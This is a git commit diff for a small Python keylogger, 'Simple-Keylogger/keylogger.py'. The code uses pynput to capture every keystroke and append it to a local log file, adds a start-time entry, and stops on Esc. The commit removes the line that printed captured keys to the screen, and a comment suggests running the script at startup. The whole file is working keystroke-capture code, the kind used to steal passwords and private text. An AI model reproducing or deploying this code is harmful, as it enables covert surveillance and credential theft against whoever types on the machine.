b4efc2fc3ef0c4d9d98df2d6012decc98fa5d9ec
david <davidhaudran@gmail.com>
2022-04-08 23:10:57 +0200

    Added time log and code comments

--- Simple-Keylogger/keylogger.py
+++ Simple-Keylogger/keylogger.py
@@ -1,25 +1,46 @@
+from datetime import datetime
 from pynput.keyboard import Key, Listener
 
 
 def on_press(key):
-    print("{0} pressed".format(key)) #only to show what we store in the file
     write_file(key)
 
 
 def write_file(key):
+    
+    # Opens log file and write words
+    # Key.space is replaced by ' '
+    # Key.enter is replaced by '\n'
     with open("log.txt", "a") as f:
         k = str(key).replace("'", "")
         
         if k.find("space") > 0:
+            f.write(' ')
+        elif k.find("enter") > 0:
             f.write('\n')
         else:
             f.write(k)
 
 
 def on_release(key):
+
+    # Stops the program if Key.esc is pressed
     if key == Key.esc:
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+def main():
+
+    # Opens the log file and write the date and time
+    # at which the program started
+    # I think it can be useful if it's a script you run at startup
+    with open("log.txt", "a") as f:
+        f.write(f"\nKeylogger started at: {datetime.now()}\n")
+    
+
+    # Creates a listener and maps keys actions to functions, see pynput
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
